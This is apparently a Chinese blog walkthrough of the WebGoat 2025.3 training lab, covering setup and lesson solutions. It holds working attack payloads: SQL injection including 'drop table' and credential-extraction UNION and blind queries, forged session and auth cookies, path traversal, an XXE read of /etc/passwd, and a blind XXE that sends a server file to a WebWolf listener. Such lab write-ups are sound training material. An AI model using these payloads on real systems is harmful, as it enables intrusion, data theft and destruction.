---
title: "WebGoat 2025.3 通关教程"
description: "记录 WebGoat 2025.3 靶场环境搭建、代理配置和部分课程通关思路。"
date: "2026-08-05"
updated: "2026-08-05"
categories: ["Practice"]
tags: ["WebGoat", "Web", "Security", "Writeup"]
type: tech
permalink: "/webgoat-2025-3-通关教程"
---
## 目录

1. [靶场环境搭建](#article-heading-1-1-靶场环境搭建)
   1. [环境要求](#article-heading-2-11-环境要求)
   2. [安装方法](#article-heading-3-12-安装方法)
   3. [配合代理工具（Burp Suite）](#article-heading-4-13-配合代理工具burp-suite)
2. [部分通关攻略](#article-heading-5-2-部分通关攻略)
   1. [Introduction 入门课程](#article-heading-6-introduction入门课程)
   2. [(A1) Broken Access Control 访问控制失效](#article-heading-7-a1-broken-access-control-访问控制失效)
   3. [(A2) Cryptographic Failures 加密失败](#article-heading-8-a2-cryptographic-failures-加密失败)
   4. [(A3) Injection 注入](#article-heading-9-a3-injection-注入)
   5. [(A5) Security Misconfiguration 安全配置错误](#article-heading-10-a5-security-misconfiguration-安全配置错误)
   6. [(A10) Server-Side Request Forgery（SSRF 服务端请求伪造）](#article-heading-11-a10-server-side-request-forgeryssrf-服务端请求伪造)
   7. [Client Side 客户端侧](#article-heading-12-client-side-客户端侧)
   8. [Challenge 挑战关](#article-heading-13-challenge挑战关)
      1. [Admin lost password](#article-heading-14-admin-lost-password)
      2. [Without password](#article-heading-15-without-password)

---

## 1. 靶场环境搭建

### 1.1 环境要求

- 方式 A：Docker
- 方式 B：Java 25（JDK 25，2025.x 起要求 JDK 25，旧版为 21）直接跑 jar
- 工具：Burp Suite（或 OWASP ZAP）+ Chrome/Firefox（F12 开发者工具）

### 1.2 安装方法

**Docker（最简单）**

```bash
docker run -it -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 webgoat/webgoat
```

> **提示：** 如果部分课程结果不对，可能是时区问题，Docker 加 `-e TZ=Asia/Shanghai` 重启即可。

**JAR 方式**

到 <https://github.com/WebGoat/WebGoat/releases> 下载 `webgoat-2025.3.jar`：

```bash
java -Dfile.encoding=UTF-8 -jar webgoat-2025.3.jar
# 自定义端口：
java -jar webgoat-2025.3.jar --webgoat.port=8001 --webwolf.port=8002
```

启动后访问：

- WebGoat：<http://127.0.0.1:8080/WebGoat/>
- WebWolf：<http://127.0.0.1:9090/WebWolf/>

首次使用点 **Register** 注册一个账号（随意填），之后用该账号登录。

### 1.3 配合代理工具（Burp Suite）

HTTP Proxies 课程要求你学会用代理改包，后续大量课程也要抓包，建议一开始就配好：

1. 启动 Burp Suite，Proxy 监听 `127.0.0.1:8080`（默认）。
2. 浏览器设置 HTTP 代理为 `127.0.0.1:8080`（或装 FoxyProxy 插件）。
3. 关掉拦截（Intercept off）正常浏览，需要改包时打开 Intercept 或把请求 Send to Repeater / Intruder。

> **提示：** WebGoat 默认绑定 localhost，走 Burp 代理时若遇到 `Could not connect`，可在 hosts 里加 `127.0.0.1 www.webgoat.local www.webwolf.local`，再用环境变量启动：
>
> `docker run ... -e WEBGOAT_HOST=www.webgoat.local -e WEBWOLF_HOST=www.webwolf.local webgoat/webgoat`
>
> 访问 `http://www.webgoat.local:8080/WebGoat/`。

---
## 2. 部分通关攻略

### Introduction（入门课程）

#### HTTP Basics（HTTP 基础）

- **Task 2**：在输入框输入名字点 Go，服务器会把输入**反转**后回显。就是练习一次 POST 请求。
- **Task 3（测验）**：
  - 问题 1：本课用的 HTTP 方法是什么？→ `POST`（点 Go 后浏览器 URL 没有变化，参数在 body 里，说明是 POST）
  - 问题 2：magic number 是多少？→ 抓包看 POST body 里的 `magic_num` 参数（**每次随机**，如 `7`、`49`），抓到立即填上去提交。
  ![HTTP Basics 示例](/posts/WebGoat-2025.3-通关教程/1.2.png)

> **提示：** 如果 8080 端口被占用，可以换端口：JAR 方式使用 `--webgoat.port=8001 --webwolf.port=8002`；Docker 方式改为 `-p 127.0.0.1:8001:8080`。

#### HTTP Proxies（HTTP 代理）

- **Task 5（拦截并修改请求）**：这关需要你设置一个代理，然后拦截请求，并将请求修改。点击页面按钮触发请求，打开 BP 设置代理，并打开拦截。做以下修改：

  1. 请求方法 POST → **GET**；
  2. 添加请求头：`x-request-intercepted: true`；
  3. 删除请求 body，把参数 `changeMe` 移到 URL 查询串：`changeMe=Requests are tampered easily`。
  
   修改后 Forward 放行即完成。

   ![HTTP Proxies 请求修改示例](/posts/WebGoat-2025.3-通关教程/1.3.png)

#### Developer Tools（开发者工具）

- **Task 4**：F12 打开控制台（Console），输入 `webgoat.customjs.phoneHome()`，回车后会输出 `phone home said {...}`，把其中的**随机数字**复制到题目输入框提交（每次调用随机生成，取最新的）。

  ![Developer Tools 示例](/posts/WebGoat-2025.3-通关教程/1.4.png)

- **Task 6**：F12 打开 Network，点页面按钮，在请求列表中找到一个含 `networkNum` 字段的请求，把数字填入提交。

#### CIA Triad（信息安全三要素）

理论课，介绍数据的三要素，保密性 Confidentiality / 完整性 Integrity / 可用性 Availability。

- **Task 5**：测验，答案如下：

  1. How could an intruder harm the security goal of confidentiality?

  - **正确答案：** Solution 3: By stealing a database where names and emails are stored and uploading it to a website.
  - **解析：** **机密性（Confidentiality）** 旨在保护敏感数据不被未授权泄露或查看。窃取包含用户姓名和邮箱的数据库并公开发布，直接破坏了数据的保密性。

  2. How could an intruder harm the security goal of integrity?

  - **正确答案：** Solution 1: By changing the names and emails of one or more users stored in a database.
  - **解析：** **完整性（Integrity）** 确保数据在存储或传输过程中不被未授权篡改。篡改数据库中的姓名和邮箱破坏了数据的真实性和准确性。

  3. How could an intruder harm the security goal of availability?

  - **正确答案：** Solution 4: By launching a denial of service attack on the servers.
  - **解析：** **可用性（Availability）** 确保授权用户可以在需要时访问服务。拒绝服务攻击（DoS/DDoS）会导致服务器无法处理正常请求，直接破坏可用性。

  4. What happens if at least one of the CIA security goals is harmed?

  - **正确答案：** Solution 2: The systems security is compromised even if only one goal is harmed.
  - **解析：** CIA 三要素中**只要有任意一个**要素遭到破坏，系统的整体安全防御就被视为已被攻破（Compromised）。
---
### (A1) Broken Access Control 访问控制失效

#### Hijack a Session（会话劫持）

目标：通过猜测他人 session cookie 登录别人的会话。

1. 页面有个登录表单，抓包看到带 `hijack_cookie` 的 Cookie 请求，服务端返回 `false`。
2. 把请求发到 Repeater 重发几次，观察响应里的 `Set-Cookie: hijack_cookie=...`，发现 cookie 是两段，用 `-` 分隔：**前半段是一个递增的大数字，后半段是时间戳**（如 `8195750994134671443-1695802682250`）。
3. 连续多发几次请求收集几个 cookie，找出相邻值之间"缺一个"的数字段（比如拿到了 `...443-1695802682250` 和 `...445-1695802693571`，那么 `...444-...` 就是中间值）。

![Hijack a Session 步骤一](/posts/WebGoat-2025.3-通关教程/2.1.1.png)
4. 用 Intruder 爆破：以 `hijack_cookie=6712622720398498768-§1785937193054§` 为变量，在中间时间戳区间内枚举，长度不同的响应即为正确 cookie。

![Hijack a Session 步骤二](/posts/WebGoat-2025.3-通关教程/2.1.2.png)

5. 查看结果，有个返回长度不一样，就是这个了

![Hijack a Session 步骤三](/posts/WebGoat-2025.3-通关教程/2.1.3.jpeg)

6. 把正确 cookie 填入请求，返回 `true`，过关。

> 原理：session id 可预测（递增数字 + 时间戳），属于可预测的会话标识符。

#### Insecure Direct Object References（IDOR 越权）

- **Task 2**：用内置账号 `tom` / `cat` 登录。

- **Task 3**：点击 View Profile 后抓包看响应，页面只展示部分字段，但**响应里还有 `role` 和 `userId` 两个隐藏字段**，答案就填这两个字段名（注意顺序）。

  ![IDOR 示例](/posts/WebGoat-2025.3-通关教程/2.2.png)

- **Task 4**：猜获取个人资料的 URL：`/WebGoat/IDOR/profile/2342384`（RESTful 风格，自己的 userId 是 2342384）。

- **Task 5**：访问他人资料：把 userId 换掉爆破（2342384~2342400 范围），找到 **`2342388`**（用户 Buffalo Bill）。然后修改其资料：抓包后把 GET 改成 **PUT**，body 改为 JSON：
  
  ```json
  {"role":"1","color":"red","size":"large","name":"Buffalo Bill","userId":"2342388"}
  ```
  把颜色改成 red、角色改成低级（1）后提交。

#### Missing Function Level Access Control（缺失功能级访问控制）

- **Task 2**：F12 查看页面 HTML 源码，发现两个隐藏的菜单链接：**`Users`** 和 **`Config`**。
- **Task 3**：直接 GET 请求 `/WebGoat/users`，同时在请求头加 **`Content-Type: application/json`**（欺骗服务端以 JSON 返回），响应中泄露所有用户信息（含 jerry 的密码 hash 等）。
- **Task 4**：思路：先把自己提权成 admin——抓包用 POST 修改自己账号的 `admin` 字段为 `true`，然后再 GET `/WebGoat/users-admin-fix` 就能拿到用户列表了。

#### Spoofing an Authentication Cookie（伪造认证 Cookie）

目标：根据 cookie 生成规律伪造任意用户的 cookie。

1. 分别用 `webgoat`、`admin` 两个内置账号登录，抓包得到两个 `spoof_auth` cookie：
   ```
   webgoat: NmU0ODU3NDU1ODVhNzg0MjY0NDI3NDYxNmY2NzYyNjU3Nw==
   admin:   NmU0ODU3NDU1ODVhNzg0MjY0NDI2ZTY5NmQ2NDYx
   ```
2. Base64 解码 → 得到一串看起来像十六进制的字符串；
3. 再按十六进制解码（Hex）→ 得到明文，例如：
   ```
   nHWEXZxBdBtaogbew    ← webgoat
   nHWEXZxBdBnimda      ← admin
   ```
4. 规律：**固定前缀 `nHWEXZxBdB` + 用户名的反转**（webgoat → taogbew，admin → nimda）。
5. 伪造 Tom：`nHWEXZxBdB` + `moT` = `nHWEXZxBdBmoT`
   → 转 Hex：`6e485745585a784264426d6f54`
   → 转 Base64：`NmU0ODU3NDU1ODVhNzg0MjY0NDI2ZDZmNTQ=`
6. 把该值作为 `spoof_auth` cookie 提交，过关。

---

### (A2) Cryptographic Failures 加密失败


#### Crypto Basics（密码学基础）

- **Task 2**：题目给了一段密文，直接 **Base64 解码**得到用户名和密码。

- **Task 3**：XOR 加密。XOR 需要密钥，这里用的是 WebSphere 默认异或密钥 **`_`（下划线）**，把密文逐字节与 `_` 异或得到明文：`databasepassword`。

- **Task 4**：哈希破解。给出的哈希是 MD5/SHA1，用 <https://www.cmd5.org/> 之类在线破解，得到明文 `secret` / `password`。

- **Task 6**：RSA 公钥与签名。给出私钥 `test.key`：
  ```bash
  # 由私钥导出公钥
  openssl rsa -in test.key -pubout > test.pub
  # 计算公钥 modulus
  openssl rsa -in test.pub -pubin -modulus -noout
  # 用私钥对 modulus 做 SHA256 签名并 base64
  echo -n "00AE89..." | openssl dgst -sign test.key -sha256 | base64
  ```
  把 modulus 和 base64 签名填入提交。
  
- **Task 8**：找密钥。运行辅助容器并进入找文件：
  ```bash
  docker run -d webgoat/assignments:findthesecret
  docker exec -it --user=root <容器ID> /bin/bash
  # 在 /root/ 下找到密钥文件
  ```

---

### (A3) Injection 注入

#### SQL Injection (intro)（SQL 注入入门）

本课是 SQL 语法练习 + 字符串注入：

- **Task 2**（检索 Bob Franco 的部门）：
  
  ```sql
  select department from employees where userid='96134'
  ```
- **Task 3**（把 Tobi Barnett 部门改为 Sales）：
  ```sql
  update employees set department='Sales' where userid='89762'
  ```
- **Task 4**（加一列 phone）：
  ```sql
  alter table employees add phone varchar(20)
  ```
- **Task 5**（授权 UnauthorizedUser 修改表）：
  ```sql
  grant alter table to UnauthorizedUser
  ```
- **Task 9**（字符串 SQL 注入，绕过登录取出全部数据）：姓输入
  ```
  Smith' or '1'='1
  ```
  原理：原查询 `WHERE last_name = 'Smith' or '1'='1'`，恒真，返回所有行。
- **Task 10**（数字型注入）：查询是 `WHERE login_count = " + num + " AND userid = " + id`。在 **Login_Count 输入 `1 or 1=1 --`**（数字型无需闭合，`--` 注释掉后面），User_ID 随便填个数字。
- **Task 11**（机密性：查出所有人的工资）：在名字框注入：
  ```
  ' or true --
  ```
  （闭合单引号 + 恒真 + 注释），TAN 框填任意值即可。
- **Task 12**（完整性：给自己涨工资）——**堆叠注入**：
  ```
  lusuo'; update employees set salary=999999999 where userid=37648--
  ```
  先闭合单引号，用 `;` 结束原语句，执行 update，最后注释掉多余部分。（userid 37648 = John Smith）
- **Task 13**（可用性：删表掩盖操作记录）：
  ```
  lusuo'; drop table access_log--
  ```

#### SQL Injection (advanced)（SQL 注入进阶）

- **Task 3**（UNION 注入爆密码）：已知两张表 `user_data`（7 列）和 `user_system_data`（user_name, password, ...）。任务是查出 Dave 的密码。在 last name 输入框注入：
  ```
  1' union select 1,user_name,password,'1','2','3',4 from user_system_data where user_name='dave'--
  ```
  也可以写成 `' or true union select ...`。结果中 Dave 的密码是 **`passW0rD`**。
  > UNION 规则：两段 SELECT 列数必须一致（这里 7 列）、对应列类型要匹配。
- **Task 5**（布尔盲注爆 Tom 的密码）：
  登录框无注入点，注入点在**注册页的用户名** `username_reg`：
  - 判断存在盲注：`tom' and 1=1--` → 提示 "already exists"（真）；`tom' and 1=2--` → 提示 "created"（假）。
  - 猜密码列名：`tom' and length(password)>0--` 为真，说明列名是 `password`。
  - 逐位爆破：`tom' and substr(password,1,1)='x'--`，用 Intruder 两个变量（位置 1~n、字符 a-zA-Z0-9 等），"already exists" 即为命中。
  - 爆出的密码（2023.x 为）：`thisisasecretfortomonly`
  - 用 `tom` 和该密码登录即可（旧版 8.0 密码为 23 位，注意版本差异，方法不变）。
- **Task 6（测验）**：Prepared Statement（预处理语句）相关，常见答案序列 **4,3,2,3,4**（Q1 语句有值而非预处理→4；Q2 占位符是 `?`→3；Q3 预编译一次更快→2；Q4 占位符把代码与数据分离→3/4；Q5 `Robert'); DROP TABLE Students;--` 会被原样当字符串注册→4）。不同版本题号略有出入，按含义理解作答。

#### SQL Injection (mitigation)（SQL 注入防御）

- **Task 5**（补全防注入代码）：把查询改成参数化：
  ```java
  Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
  PreparedStatement ps = conn.prepareStatement("SELECT status FROM users WHERE name = ? AND mail = ?");
  ps.setString(1, name);
  ps.setString(2, mail);
  ```
- **Task 6**（写一段参数化查询代码）：题目给了残缺代码，把查询改用 `PreparedStatement` + `ps.setString(1, "admin")` 即可。
- **Task 9**（过滤空格绕过）：提交 `1' or 1=1--` 被拦截（空格被过滤），用注释或加号代替空格：
  ```
  1'/**/or/**/1=1--+
  ```
  然后 UNION 注入（空格全部用 `/**/` 代替）：
  ```
  1'/**/union/**/select/**/1,user_name,password,'1','2','3',4/**/from/**/user_system_data--+
  ```
- **Task 10**（关键字过滤双写绕过）：`select`、`from` 被直接删除 → **双写绕过**：
  ```
  1'/**/union/**/selselectect/**/1,user_name,password,'1','2','3',4/**/frfromom/**/user_system_data--+
  ```
- **Task 12**（ORDER BY 盲注爆 IP）：排序接口的 `column` 参数拼进 ORDER BY。构造 `case when` 条件语句逐位爆破 webgoat-prd 的 IP（尾段已给出 `xxx.130.219.202`）：
  ```
  /WebGoat/SqlInjectionMitigations/servers?column=(case%20when%20(substring((select%20ip%20from%20servers%20where%20hostname=%27webgoat-prd%27),§1§,1)=§2§)%20then%20hostname%20else%20id%20end)
  ```
  变量 1：位置 1~15；变量 2：`0~9`。响应按 hostname 排序的即为命中。答案：**`104.130.219.202`**。

#### Path Traversal（路径遍历）

- **Task 2**：上传任意文件，响应回显完整路径。直接在上传文件名里加 `../` 即可穿越目录。
- **Task 3**：过滤了 `../` → **双写绕过**：`.././test`（或 `....//`、`..//`）。
- **Task 4**：服务端不再采用页面提交的文件名，而是抓包直接**修改请求中的文件名字段**为 `../xxx`。
- **Task 5**：图片请求带 `id=3` 参数，服务端会拼 `.jpg` 后缀。尝试 `id=../path-traversal-secret` 报非法字符 → **URL 编码绕过**：
  ```
  id=%2e%2e%2fpath-traversal-secret        （400，还在上层）
  id=%2e%2e%2f%2e%2e%2fpath-traversal-secret  （成功）
  ```
  文件内容是一个用户名（如 Tom），把**该用户名做 SHA-512 哈希**后提交（可以用 `echo -n "Tom" | sha512sum` 或在线工具）。

---

### (A5) Security Misconfiguration 安全配置错误

#### XML External Entities (XXE)（XXE 外部实体注入）

- **Task 4-7（常规 XXE 读文件）**：提交评论时抓包，发现请求体是 XML。把内容替换为带外部实体的 DTD：
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE comment [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <comment><text>&xxe;</text></comment>
  ```
  Windows 上读目录用 `file:///C:/`（或 WebGoat 安装目录），响应会把文件/目录内容渲染出来。
- **Task 8-10（理论）**：billion laughs 实体膨胀 DDoS；盲 XXE。
- **Task 11（盲 XXE 外带文件）**：读服务器上某目录的 `secret.txt` 并外带到 WebWolf：
  1. 在 WebWolf 上传一个恶意 DTD（`xxe1.dtd`）：
     ```xml
     <!ENTITY % file SYSTEM "file:///<服务器上secret文件的完整路径>">
     <!ENTITY % write "<!ENTITY send SYSTEM 'http://127.0.0.1:9090/landing?text=%file;'>">
     ```
  2. 在 WebGoat 评论处提交：
     ```xml
     <?xml version="1.0"?>
     <!DOCTYPE comment [
       <!ENTITY % dtd SYSTEM "http://<你的IP>:9090/files/<用户名>/xxe1.dtd">
       %dtd;
       %write;
     ]>
     <comment><text>test</text></comment>
     ```
  3. 去 WebWolf 的 Requests 页面查看：URL 参数 `text=` 后面就是文件内容，把内容（%20 替换为空格）填入提交。
- **Task 12（防御）**：禁用 DTD / 外部实体（理论）。

#### Vulnerable Components（漏洞组件）

- **Task（XStream 反序列化 CVE-2013-7285）**：输入框接受 XML，直接提交：
  ```xml
  <contact>123456789</contact>
  ```
  添加一个联系人即可（组件版本存在 RCE 漏洞）。
- **Task（代码执行）**：部分版本可通过反序列化执行命令（Windows）：
  ```
  foo java.lang.Comparable ipconfig start
  foo java.lang.Comparable calc start
  ```

---

### (A10) Server-Side Request Forgery（SSRF 服务端请求伪造）

- **Task 2**：页面按钮获取 Tom 的图片，抓包发现 URL 参数（如 `url=...Tom...`），改成 **`jerry`** 重放，返回 Jerry 的信息。
- **Task 3**：抓包把 `images` 参数的值改成 **`http://ifconfig.pro`**，点击 Go，页面显示服务器本机 IP 等配置信息（内网/外网探测）。
- **Task 4**：防御理论（白名单校验协议、域名、拒绝用户输入）。

---

### Client Side 客户端侧

#### Bypass front-end restrictions（绕过前端限制）

- **Task 2**：提交表单抓包，把各参数值随意改动后重放，服务端**不校验**（校验只在前端）→ 说明后端缺少验证。
- **Task 3（正则绕过）**：题目展示 7 个字段的前端正则（小写字母、3 位数字、邮编、电话等）。直接抓包提交不满足正则的值绕过，现成 payload：
  ```
  field1=ac&field2=1df23&field3=abc+1s,df23+ABC&field4=sesdf56ven&field5=0110sd1&field6=9021sdf0-1111&field7=301-6dfs04-4882&error=0
  ```

#### Client side filtering（客户端过滤）

- **Task 2**：员工薪资系统，CEO（Neville Bartholomew）的信息被前端过滤掉不展示。选择 CEO 时**根本不发请求**，说明数据在页面静态资源里 → F12 源码里搜 `Neville` → 答案：**`450000`**（CEO 工资）。
- **Task 3**：优惠券接口权限设置不严，直接访问：
  ```
  http://127.0.0.1:8080/WebGoat/clientSideFiltering/challenge-store/coupons
  ```
  返回隐藏优惠券码 **`get_it_for_free`**，填入后买手机过关。

#### HTML tampering（HTML 篡改）

- **Task 2**：电视 2999 元太贵。点 checkout 抓包，把请求中的**单价参数改为 `1`** 重放，1 块钱买下 → 过关。
- **Task 3**：防御理论（服务端必须重新校验金额）。

---

### Challenge（挑战关）

> 挑战关的 flag 每次部署随机，以下 flag 仅示例，**方法与思路不变**。

### Admin lost password

- 页面要求爆破 admin 密码，但直接爆破不现实。
- 页面有一张显眼图片，F12 查看图片地址为 `/WebGoat/challenge/logo`，下载后**用记事本打开，Ctrl+F 搜 `admin`**，发现硬编码密码 **`!!webgoat_admin_8702!!`**。
- 用它登录拿到 flag（如 `f4086c48-5859-44e3-99c1-165b31d10304`）。

### Without password

- 用户名填 `Larry`，密码填：
  ```
  or true --
  ```
  抓包可见密码被直接拼进 SQL 查询（无引号包裹），`or true --` 恒真绕过。flag（如 `203f882f-...`）。

---
